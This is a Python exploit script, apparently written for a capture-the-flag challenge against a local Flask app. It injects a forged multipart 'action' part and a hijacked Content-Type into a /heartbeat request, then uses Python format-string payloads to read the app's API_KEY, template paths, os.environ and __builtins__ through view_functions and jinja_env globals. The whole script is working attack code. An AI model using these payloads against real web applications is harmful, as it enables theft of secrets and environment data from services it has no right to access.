import httpx
import re

TARGET = "http://127.0.0.1:5000"
BOUNDARY = "---------------------------FlagBoundary123"

def format_string_leak(payload):
    """使用 format string 漏洞泄露信息"""
    # 构造假的 action 部分，类型为 debug
    fake_action_part = (
        f'\r\n--{BOUNDARY}\r\n'
        f'Content-Disposition: form-data; name="action"; filename="action"\r\n'
        f'Content-Type: text/json\r\n\r\n'
        f'{{"type": "debug"}}\r\n'
    )
    
    text = payload + fake_action_part
    params = {
        'text': text,
        'client': 'Content-Type',
        'token': f'multipart/form-data; boundary={BOUNDARY}'
    }
    
    r = httpx.post(f"{TARGET}/heartbeat", data=params, timeout=5.0)
    return r.text.strip()

# 测试 API_KEY
api_key = format_string_leak("{0.view_functions[action].__globals__[API_KEY]}")
print(f"[+] API_KEY: {api_key}")

# 测试各种属性
payloads = [
    ('{0.jinja_env.loader.searchpath}', 'loader searchpath'),
    ('{0.jinja_env.loader.searchpath[0]}', 'searchpath[0]'),
    ('{0.template_folder}', 'template_folder'),
    ('{0.root_path}', 'root_path'),
    ('{0.jinja_env.globals[lipsum].__globals__[os].sep}', 'os.sep'),
    ('{0.jinja_env.globals[lipsum].__globals__[os].curdir}', 'os.curdir'),
    ('{0.jinja_env.globals[lipsum].__globals__[os].name}', 'os.name'),
    ('{0.jinja_env.globals[lipsum].__globals__[os].environ}', 'os.environ'),
    # 尝试 __builtins__
    ('{0.jinja_env.globals[lipsum].__globals__[__builtins__]}', '__builtins__'),
]

for p, desc in payloads:
    try:
        result = format_string_leak(p)
        # 只显示前200字符
        result = result[:500] if len(result) > 500 else result
        print(f"[{desc}]: {result}")
    except Exception as e:
        print(f"[{desc}]: Error - {e}")
